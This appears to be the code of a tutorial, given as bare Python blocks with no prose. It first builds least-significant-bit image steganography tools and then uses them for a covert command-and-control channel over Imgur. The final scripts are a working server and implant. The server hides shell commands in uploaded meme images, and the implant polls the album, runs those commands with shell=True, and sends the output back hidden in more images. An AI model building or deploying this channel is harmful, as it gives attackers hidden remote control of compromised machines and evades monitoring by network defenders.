["```py\n$ pip install PIL\n\n```", "```py\n  #!/usr/bin/env python\n\nfrom PIL import Image\n\ndef Hide_message(carrier, message, outfile):\n    c_image = Image.open(carrier)\n    hide = Image.open(message)\n    hide = hide.resize(c_image.size)\n    hide = hide.convert('1')\n    out = Image.new('RGB', c_image.size)\n\n    width, height = c_image.size\n\n    new_array = []\n\n    for h in range(height):\n        for w in range(width):\n            ip = c_image.getpixel((w,h))\n            hp = hide.getpixel((w,h))\n            if hp == 0: \n                newred = ip[0] & 254\n            else: \n                newred = ip[0] | 1\n\n            new_array.append((newred, ip[1], ip[2]))\n\n    out.putdata(new_array)\n    out.save(outfile)\n    print \"Steg image saved to \" + outfile\n\nHide_message('carrier.png', 'message.png', 'outfile.png')\n```", "```py\nfrom PIL import Image\n```", "```py\ndef Hide_message(carrier, message, outfile):\n```", "```py\nc_image = Image.open(carrier)\nhide = Image.open(message)\n```", "```py\nhide = hide.resize(c_image.size)\nhide = hide.convert('1')\n```", "```py\nout = Image.new('RGB', c_image.size)\n\nwidth, height = c_image.size\n\nnew_array = []\n```", "```py\n    for h in range(height):\n        for w in range(width):\n            ip = c_image.getpixel((w,h))\n            hp = hide.getpixel((w,h))\n            if hp == 0: \n                newred = ip[0] & 254\n            else: \n                newred = ip[0] | 1\n\n            new_array.append((newred, ip[1], ip[2]))\n\n    out.putdata(new_array)\n    out.save(outfile)\n    print \"Steg image saved to \" + outfile\n```", "```py\n#!/usr/bin/env python\n\nfrom PIL import Image\n\ndef ExtractMessage(carrier, outfile):\n    c_image = Image.open(carrier)\n    out = Image.new('L', c_image.size)\n    width, height = c_image.size\n    new_array = []\n\n    for h in range(height):\n        for w in range(width):\n            ip = c_image.getpixel((w,h))\n            if ip[0] & 1 == 0:\n                new_array.append(0)\n            else:\n                new_array.append(255)\n\n    out.putdata(new_array)\n    out.save(outfile)\n    print \"Message extracted and saved to \" + outfile\n\nExtractMessage('StegTest.png', 'extracted.png')\n```", "```py\nfrom PIL import Image\n```", "```py\ndef ExtractMessage(carrier, outfile):\n```", "```py\nc_image = Image.open(carrier)\nout = Image.new('L', c_image.size)\n\nwidth, height = c_image.size\n\nnew_array = []\n```", "```py\nfrom PIL import Image\n\ndef Set_LSB(value, bit):\n    if bit == '0':\n        value = value & 254\n    else:\n        value = value | 1\n    return value\n\ndef Hide_message(carrier, message, outfile):\n    message += chr(0)\n    c_image = Image.open(carrier)\n    c_image = c_image.convert('RGBA')\n\n    out = Image.new(c_image.mode, c_image.size)\n    pixel_list = list(c_image.getdata())\n    new_array = []\n\n    for i in range(len(message)):\n        char_int = ord(message[i])\n        cb = str(bin(char_int))[2:].zfill(8)\n        pix1 = pixel_list[i*2]\n        pix2 = pixel_list[(i*2)+1]\n        newpix1 = []\n        newpix2 = []\n\n        for j in range(0,4):\n            newpix1.append(Set_LSB(pix1[j], cb[j]))\n            newpix2.append(Set_LSB(pix2[j], cb[j+4]))\n\n        new_array.append(tuple(newpix1))\n        new_array.append(tuple(newpix2))\n\n    new_array.extend(pixel_list[len(message)*2:])\n\n    out.putdata(new_array)\n    out.save(outfile)\n    print \"Steg image saved to \" + outfile\n\nHide_message('c:\\\\python27\\\\FunnyCatPewPew.png', 'The quick brown fox jumps over the lazy dogs back.', 'messagehidden.png')\n```", "```py\nfrom PIL import Image\n```", "```py\ndef Set_LSB(value, bit):\n    if bit == '0':\n        value = value & 254\n    else:\n        value = value | 1\n    return value\n```", "```py\ndef Hide_message(carrier, message, outfile):\n```", "```py\nmessage += chr(0)\n```", "```py\nc_image = Image.open(carrier) \nc_image = c_image.convert('RGBA')\nout = Image.new(c_image.mode, c_image.size)\n\npixel_list = list(c_image.getdata())\nnew_array = []\n```", "```py\nfor i in range(len(message)):\n```", "```py\nchar_int = ord(message[i])\n```", "```py\ncb = str(bin(char_int))[2:].zfill(8)\n```", "```py\npix1 = pixel_list[i*2]\npix2 = pixel_list[(i*2)+1]\n```", "```py\nnewpix1 = []\nnewpix2 = []\n```", "```py\nfor j in range(0,4):\n            newpix1.append(Set_LSB(pix1[j], cb[j]))\n            newpix2.append(Set_LSB(pix2[j], cb[j+4]))\n```", "```py\nnew_array.append(tuple(newpix1))\nnew_array.append(tuple(newpix2))\n```", "```py\nnew_array.extend(pixel_list[len(message)*2:])\n\nout.putdata(new_array)\nout.save(outfile)\nprint \"Steg image saved to \" + outfile\n```", "```py\nif len(message) * 2 < len(list(image.getdata())):\n  #Throw an error and advise the user\n```", "```py\nfrom PIL import Image\nfrom itertools import izip\n\ndef get_pixel_pairs(iterable):\n    a = iter(iterable)\n    return izip(a, a)\n\ndef get_LSB(value):\n    if value & 1 == 0:\n        return '0'\n    else:\n        return '1'\n\ndef extract_message(carrier):\n    c_image = Image.open(carrier)\n    pixel_list = list(c_image.getdata())\n    message = \"\"\n\n    for pix1, pix2 in get_pixel_pairs(pixel_list):\n        message_byte = \"0b\"\n        for p in pix1:\n            message_byte += get_LSB(p)\n\n        for p in pix2:\n            message_byte += get_LSB(p)\n\n        if message_byte == \"0b00000000\":\n            break\n\n        message += chr(int(message_byte,2))\n    return message\n\nprint extract_message('messagehidden.png')\n```", "```py\nfrom PIL import Image\nfrom itertools import izip\n```", "```py\ndef get_pixel_pairs(iterable):\n    a = iter(iterable)\n    return izip(a, a)\n\ndef get_LSB(value):\n    if value & 1 == 0:\n        return '0'\n    else:\n        return '1'\n```", "```py\ndef extract_message(carrier):\n```", "```py\nc_image = Image.open(carrier)\npixel_list = list(c_image.getdata())\nmessage = \"\"\n```", "```py\nfor pix1, pix2 in get_pixel_pairs(pixel_list):\n```", "```py\nmessage_byte = \"0b\"\nfor p in pix1:\n    message_byte += get_LSB(p)\nfor p in pix2:\n    message_byte += get_LSB(p)\n```", "```py\nif message_byte == \"0b00000000\":\n            break\n```", "```py\nmessage += chr(int(message_byte,2))\n```", "```py\n#!/usr/bin/env python\n\nimport sys\nimport urllib\nimport cStringIO\n\nfrom optparse import OptionParser\nfrom PIL import Image\nfrom itertools import izip\n\ndef get_pixel_pairs(iterable):\n    a = iter(iterable)\n    return izip(a, a)\n\ndef set_LSB(value, bit):\n    if bit == '0':\n        value = value & 254\n    else:\n        value = value | 1\n    return value\n\ndef get_LSB(value):\n    if value & 1 == 0:\n        return '0'\n    else:\n        return '1'\n\ndef extract_message(carrier, from_url=False):\n    if from_url:\n        f = cStringIO.StringIO(urllib.urlopen(carrier).read())\n        c_image = Image.open(f)\n    else:\n        c_image = Image.open(carrier)\n\n    pixel_list = list(c_image.getdata())\n    message = \"\"\n\n    for pix1, pix2 in get_pixel_pairs(pixel_list):\n        message_byte = \"0b\"\n        for p in pix1:\n            message_byte += get_LSB(p)\n\n        for p in pix2:\n            message_byte += get_LSB(p)\n\n        if message_byte == \"0b00000000\":\n            break\n\n        message += chr(int(message_byte,2))\n    return message\n\ndef hide_message(carrier, message, outfile, from_url=False):\n    message += chr(0)\n    if from_url:\n        f = cStringIO.StringIO(urllib.urlopen(carrier).read())\n        c_image = Image.open(f)\n    else:\n        c_image = Image.open(carrier)\n\n    c_image = c_image.convert('RGBA')\n\n    out = Image.new(c_image.mode, c_image.size)\n    width, height = c_image.size\n    pixList = list(c_image.getdata())\n    newArray = []\n\n    for i in range(len(message)):\n        charInt = ord(message[i])\n        cb = str(bin(charInt))[2:].zfill(8)\n        pix1 = pixList[i*2]\n        pix2 = pixList[(i*2)+1]\n        newpix1 = []\n        newpix2 = []\n\n        for j in range(0,4):\n            newpix1.append(set_LSB(pix1[j], cb[j]))\n            newpix2.append(set_LSB(pix2[j], cb[j+4]))\n\n        newArray.append(tuple(newpix1))\n        newArray.append(tuple(newpix2))\n\n    newArray.extend(pixList[len(message)*2:])\n\n    out.putdata(newArray)\n    out.save(outfile)\n    return outfile   \n\nif __name__ == \"__main__\":\n\n    usage = \"usage: %prog [options] arg1 arg2\"\n    parser = OptionParser(usage=usage)\n    parser.add_option(\"-c\", \"--carrier\", dest=\"carrier\",\n                help=\"The filename of the image used as the carrier.\",\n                metavar=\"FILE\")\n    parser.add_option(\"-m\", \"--message\", dest=\"message\",\n                help=\"The text to be hidden.\",\n                metavar=\"FILE\")\n    parser.add_option(\"-o\", \"--output\", dest=\"output\",\n                help=\"The filename the output file.\",\n                metavar=\"FILE\")\n    parser.add_option(\"-e\", \"--extract\",\n                action=\"store_true\", dest=\"extract\", default=False,\n                help=\"Extract hidden message from carrier and save to output filename.\")\n    parser.add_option(\"-u\", \"--url\",\n                action=\"store_true\", dest=\"from_url\", default=False,\n                help=\"Extract hidden message from carrier and save to output filename.\")\n\n    (options, args) = parser.parse_args()\n    if len(sys.argv) == 1:\n        print \"TEST MODE\\nHide Function Test Starting ...\"\n        print hide_message('carrier.png', 'The quick brown fox jumps over the lazy dogs back.', 'messagehidden.png')\n        print \"Hide test passed, testing message extraction ...\"\n        print extract_message('messagehidden.png')\n    else:\n        if options.extract == True:\n            if options.carrier is None:\n                parser.error(\"a carrier filename -c is required for extraction\")\n            else:\n                print extract_message(options.carrier, options.from_url)\n        else:\n            if options.carrier is None or options.message is None or options.output is None:\n                parser.error(\"a carrier filename -c, message filename -m and output filename -o are required for steg\")\n            else:\n                hide_message(options.carrier, options.message, options.output, options.from_url)\n```", "```py\n$ pip install imgurpython\n\n```", "```py\nfrom imgurpython import ImgurClient\nimport StegoText, random, time, ast, base64\n\ndef get_input(string):\n    ''' Get input from console regardless of python 2 or 3 '''\n    try:\n        return raw_input(string)\n    except:\n        return input(string)\n\ndef create_command_message(uid, command):\n    command = str(base64.b32encode(command.replace('\\n','')))\n    return \"{'uuid':'\" + uid + \"','command':'\" + command + \"'}\"\n\ndef send_command_message(uid, client_os, image_url):\n    command = get_input(client_os + \"@\" + uid + \">\")\n    steg_path = StegoText.hide_message(image_url, create_command_message(uid, command), \"Imgur1.png\", True)\n    print \"Sending command to client ...\"\n    uploaded = client.upload_from_path(steg_path)\n    client.album_add_images(a[0].id, uploaded['id'])\n\n    if command == \"quit\":\n        sys.exit()\n\n    return uploaded['datetime']\n\ndef authenticate():\n    client_id = '<REPLACE WITH YOUR IMGUR CLIENT ID>'\n    client_secret = '<REPLACE WITH YOUR IMGUR CLIENT SECRET>'\n\n    client = ImgurClient(client_id, client_secret)\n    authorization_url = client.get_auth_url('pin')\n\n    print(\"Go to the following URL: {0}\".format(authorization_url))\n    pin = get_input(\"Enter pin code: \")\n\n    credentials = client.authorize(pin, 'pin')\n    client.set_user_auth(credentials['access_token'], credentials['refresh_token'])\n\n    return client\n\nclient = authenticate()\na = client.get_account_albums(\"C2ImageServer\")\n\nimgs = client.get_album_images(a[0].id)\nlast_message_datetime = imgs[-1].datetime\n\nprint \"Awaiting client connection ...\"\n\nloop = True\nwhile loop:\n    time.sleep(5)\n    imgs = client.get_album_images(a[0].id)\n    if imgs[-1].datetime > last_message_datetime:\n        last_message_datetime = imgs[-1].datetime\n        client_dict =  ast.literal_eval(StegoText.extract_message(imgs[-1].link, True))\n        if client_dict['status'] == \"ready\":\n            print \"Client connected:\\n\"\n            print \"Client UUID:\" + client_dict['uuid']\n            print \"Client OS:\" + client_dict['os']\n        else:\n            print base64.b32decode(client_dict['response'])\n\n        random.choice(client.default_memes()).link\n        last_message_datetime = send_command_message(client_dict['uuid'],\n        client_dict['os'],\n        random.choice(client.default_memes()).link)\n```", "```py\nfrom imgurpython import ImgurClient\nimport StegoText\nimport ast, os, time, shlex, subprocess, base64, random, sys\n\ndef get_input(string):\n    try:\n        return raw_input(string)\n    except:\n        return input(string)\n\ndef authenticate():\n    client_id = '<REPLACE WITH YOUR IMGUR CLIENT ID>'\n    client_secret = '<REPLACE WITH YOUR IMGUR CLIENT SECRET>'\n\n    client = ImgurClient(client_id, client_secret)\n    authorization_url = client.get_auth_url('pin')\n\n    print(\"Go to the following URL: {0}\".format(authorization_url))\n    pin = get_input(\"Enter pin code: \")\n\n    credentials = client.authorize(pin, 'pin')\n    client.set_user_auth(credentials['access_token'], credentials['refresh_token'])\n\n    return client\n\nclient_uuid = \"test_client_1\"\n\nclient = authenticate()\na = client.get_account_albums(\"<YOUR IMGUR USERNAME>\")\n\nimgs = client.get_album_images(a[0].id)\nlast_message_datetime = imgs[-1].datetime\n\nsteg_path = StegoText.hide_message(random.choice(client.default_memes()). link,  \"{'os':'\" + os.name + \"', 'uuid':'\" + client_uuid + \"','status':'ready'}\",  \"Imgur1.png\",True)\nuploaded = client.upload_from_path(steg_path)\nclient.album_add_images(a[0].id, uploaded['id'])\nlast_message_datetime = uploaded['datetime']\n\nwhile True:\n\n    time.sleep(5) \n    imgs = client.get_album_images(a[0].id)\n    if imgs[-1].datetime > last_message_datetime:\n        last_message_datetime = imgs[-1].datetime\n        client_dict =  ast.literal_eval(StegoText.extract_message(imgs[-1].link, True))\n        if client_dict['uuid'] == client_uuid:\n            command = base64.b32decode(client_dict['command'])\n\n            if command == \"quit\":\n                sys.exit(0)\n\n            args = shlex.split(command)\n            p = subprocess.Popen(args, stdout=subprocess.PIPE, shell=True)\n            (output, err) = p.communicate()\n            p_status = p.wait()\n\n            steg_path = StegoText.hide_message(random.choice (client.default_memes()).link,  \"{'os':'\" + os.name + \"', 'uuid':'\" + client_uuid + \"','status':'response', 'response':'\" + str(base64.b32encode(output)) + \"'}\", \"Imgur1.png\", True)\n            uploaded = client.upload_from_path(steg_path)\n            client.album_add_images(a[0].id, uploaded['id'])\n            last_message_datetime = uploaded['datetime']\n```", "```py\nclient = authenticate()\na = client.get_account_albums(\"<YOUR IMGUR ACCOUNT NAME>\")\n\nimgs = client.get_album_images(a[0].id)\nlast_message_datetime = imgs[-1].datetime\n\nprint \"Awaiting client connection ...\"\n```", "```py\nclient_uuid = \"test_client_1\"\n\nclient = authenticate()\na = client.get_account_albums(\"C2ImageServer\")\n\nimgs = client.get_album_images(a[0].id)\nlast_message_datetime = imgs[-1].datetime\n\nsteg_path = StegoText.hide_message(random.choice (client.default_memes()).link,  \"{'os':'\" + os.name + \"', 'uuid':'\" + client_uuid + \"','status':'ready'}\",  \"Imgur1.png\",True)\nuploaded = client.upload_from_path(steg_path)\nclient.album_add_images(a[0].id, uploaded['id'])\nlast_message_datetime = uploaded['datetime']\n```", "```py\nloop = True\nwhile loop:\n    time.sleep(5)\n    imgs = client.get_album_images(a[0].id)\n    if imgs[-1].datetime > last_message_datetime:\n        last_message_datetime = imgs[-1].datetime\n        client_dict = ast.literal_eval(StegoText.extract_message(imgs[-1].link, True))\n        if client_dict['status'] == \"ready\":\n            print \"Client connected:\\n\"\n            print \"Client UUID:\" + client_dict['uuid']\n            print \"Client OS:\" + client_dict['os']\n```", "```py\nloop = True\nwhile loop:\n\n    time.sleep(5) \n    imgs = client.get_album_images(a[0].id)\n    if imgs[-1].datetime > last_message_datetime:\n        last_message_datetime = imgs[-1].datetime\n        client_dict =  ast.literal_eval(StegoText.extract_message(imgs[-1].link, True))\n        if client_dict['uuid'] == client_uuid:\n            command = base64.b32decode(client_dict['command'])\n\n            if command == \"quit\":\n                sys.exit(0)\n\n            args = shlex.split(command)\n            p = subprocess.Popen(args, stdout=subprocess.PIPE, shell=True)\n            (output, err) = p.communicate()\n            p_status = p.wait()\n\n            steg_path = StegoText.hide_message(random.choice (client.default_memes()).link,  \"{'os':'\" + os.name + \"', 'uuid':'\" + client_uuid + \"','status':'response', 'response':'\" + str(base64.b32encode(output)) + \"'}\",  \"Imgur1.png\", True)\n            uploaded = client.upload_from_path(steg_path)\n            client.album_add_images(a[0].id, uploaded['id'])\n            last_message_datetime = uploaded['datetime']\n```"]